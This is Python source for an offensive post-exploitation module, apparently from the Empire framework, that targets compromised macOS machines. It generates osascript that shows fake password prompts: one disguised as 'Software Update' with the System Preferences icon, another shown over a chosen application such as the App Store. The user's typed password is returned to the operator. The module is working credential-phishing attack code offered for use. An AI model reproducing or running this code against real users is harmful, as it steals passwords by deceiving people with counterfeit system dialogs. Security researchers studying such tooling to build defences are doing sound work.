class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Prompt',
            'Author': ['@FuzzyNop', '@harmj0y'],
            'Description': ('Launches a specified application with an prompt for credentials with osascript.'),
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                "https://github.com/fuzzynop/FiveOnceInYourLife"
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'AppName' : {
                'Description'   :   'The name of the application to launch.',
                'Required'      :   True,
                'Value'         :   'App Store'
            },
            'ListApps' : {
                'Description'   :   'Switch. List applications suitable for launching.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SandboxMode' : {
                'Description'   :   'Switch. Launch a sandbox safe prompt',
                'Required'      :   False,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        listApps = self.options['ListApps']['Value']
        appName = self.options['AppName']['Value']
        sandboxMode = self.options['SandboxMode']['Value']
        if listApps != "":
            script = """
import os
apps = [ app.split('.app')[0] for app in os.listdir('/Applications/') if not app.split('.app')[0].startswith('.')]
choices = []
for x in xrange(len(apps)):
    choices.append("[%s] %s " %(x+1, apps[x]) )
print "\\nAvailable applications:\\n"
print '\\n'.join(choices)
"""
        else:
            if sandboxMode != "":
                script = """
import os
print os.popen('osascript -e \\\'display dialog "Software Update requires that you type your password to apply changes." & return & return default answer "" with icon file "Applications:System Preferences.app:Contents:Resources:PrefApp.icns" with hidden answer with title "Software Update"\\\'').read()
"""
            else:
                script = """
import os
print os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read()
""" % (appName, appName, appName, appName)
        return script